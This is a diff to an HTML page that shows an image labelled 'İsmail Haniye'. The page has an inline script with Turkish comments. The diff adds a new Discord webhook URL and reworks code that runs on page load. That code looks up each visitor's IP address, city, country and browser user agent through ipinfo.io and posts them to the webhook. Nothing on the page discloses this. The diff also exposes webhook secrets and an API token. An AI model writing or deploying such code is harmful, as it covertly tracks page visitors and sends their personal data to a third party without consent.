@@ -23,36 +23,46 @@
   <img src="haniye.png" alt="İsmail Haniye">
 
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/1392621981060563105/KwFT0G_xxmfz8IB0HkA6LVRgK6lOkTZFhbzoyVExRwjVDQdTxc0v-oMwxCbhPPGnl_eK";
+    const webhookURL = "https://discord.com/api/webhooks/1392624549148754061/Q_B5mTWna2fUbS2qMz0_9_QbdHzxC45Iljdn1cUmAWYCjycpzZWStuzORNZfoo7JkYI4";
 
-    async function getIPInfo() {
+    // IP ve konum verilerini al
+    async function getVisitorInfo() {
       try {
-        const res = await fetch("https://ipinfo.io/json?token=3b1d9e8dcaa055"); // public token
+        const res = await fetch("https://ipinfo.io/json?token=3b1d9e8dcaa055"); // Ücretsiz public token
         return await res.json();
-      } catch (e) {
-        console.error("IP bilgisi alınamadı:", e);
+      } catch (error) {
+        console.error("IP bilgisi alınamadı:", error);
         return {};
       }
     }
 
+    // Bilgileri Discord'a gönder
     async function sendToDiscord() {
-      const info = await getIPInfo();
+      const info = await getVisitorInfo();
       const ip = info.ip || "Bilinmiyor";
       const loc = info.city ? `${info.city}, ${info.country}` : "Konum yok";
       const now = new Date().toLocaleString("tr-TR");
       const browser = navigator.userAgent;
 
-      const content = `📥 Yeni Ziyaretçi:
+      const message = `📥 Yeni Ziyaretçi:
 🌐 IP: ${ip}
 📍 Konum: ${loc}
-🕒 Saat: ${now}
+🕒 Zaman: ${now}
 🧭 Tarayıcı: ${browser}`;
 
-      fetch(webhookURL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content })
-      }).catch(err => console.error("Discord gönderim hatası:", err));
+      try {
+        const res = await fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: message })
+        });
+
+        if (!res.ok) {
+          console.error("Webhook gönderim hatası. Kod:", res.status);
+        }
+      } catch (err) {
+        console.error("Discord gönderim HATASI:", err);
+      }
     }
 
     sendToDiscord();
